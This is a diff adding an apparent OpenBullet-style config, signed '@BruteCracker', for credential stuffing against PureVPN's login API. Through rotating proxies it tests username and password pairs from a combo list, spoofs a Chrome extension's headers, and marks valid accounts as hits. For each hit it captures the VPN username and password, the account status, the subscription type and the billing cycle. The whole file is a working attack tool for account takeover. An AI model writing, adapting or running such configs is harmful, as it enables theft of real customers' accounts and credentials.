@@ -1,0 +1,127 @@
+[SETTINGS]
+{
+  "Name": "PureVPN",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-28T17:48:56.0455518+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "HAMID",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "PureVPN",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "t" 
+
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+FUNCTION GenerateGUID -> VAR "ui" 
+
+REQUEST POST "https://api.proxy.purevpn.com/v1/auth/email?timestamp=<t>" 
+  CONTENT "platform_name=Chrome&platform_version=98.0.4758.102&platform_locale=en&app_version=4.16.0&user_os=win&id=bfidboloedlamgdmenmlbipfnccokknp&uuid=<ui>&usid=&email=<US>&domain_fronting=false&password=<PASS>&allow_multiuser=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.proxy.purevpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: chrome-extension://bfidboloedlamgdmenmlbipfnccokknp" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+    KEY "valid email address" 
+  KEYCHAIN Success OR 
+    KEY "vpn_password" 
+
+#usp PARSE "<SOURCE>" LR "\"vpn_username\":\"" "\"" CreateEmpty=FALSE -> CAP "USERp" 
+
+#pasp PARSE "<SOURCE>" LR "\"vpn_password\":\"" "\"" CreateEmpty=FALSE -> CAP "PASSp" 
+
+FUNCTION CurrentUnixTime -> VAR "t2" 
+
+# REQUEST POST "https://api.proxy.purevpn.com/v1/auth/verify?timestamp=<t2>" 
+  CONTENT "platform_name=Chrome&platform_version=98.0.4758.102&platform_locale=en&app_version=4.16.0&user_os=win&id=bfidboloedlamgdmenmlbipfnccokknp&uuid=<ui>&usid=&email=<US>&domain_fronting=false&user_name=<USERp>&password=<PASSp>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.proxy.purevpn.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: chrome-extension://bfidboloedlamgdmenmlbipfnccokknp" 
+
+#accountStatus PARSE "<SOURCE>" LR "\"accountStatus\":\"" "\"" CreateEmpty=FALSE -> CAP "accountStatus" 
+
+#Subscription_Type PARSE "<SOURCE>" LR "\"clientType\":\"" "\"" CreateEmpty=FALSE -> CAP "Subscription Type" 
+
+#userSignupDate1 PARSE "<SOURCE>" LR "\"userSignupDate\":" "}}" -> VAR "userSignupDate1" 
+
+#userSignupDate FUNCTION UnixTimeToDate "yyyy-MM-dd" "<userSignupDate1>" -> CAP "userSignupDate" 
+
+#billingCycle PARSE "<SOURCE>" LR "\"billingCycle\":\"" "\"" CreateEmpty=FALSE -> CAP "billingCycle" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<accountStatus>" Contains "active" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<accountStatus>" Contains "expired" 
+
+#@BruteCracker FUNCTION Constant "@BruteCracker" -> CAP "By" 
+
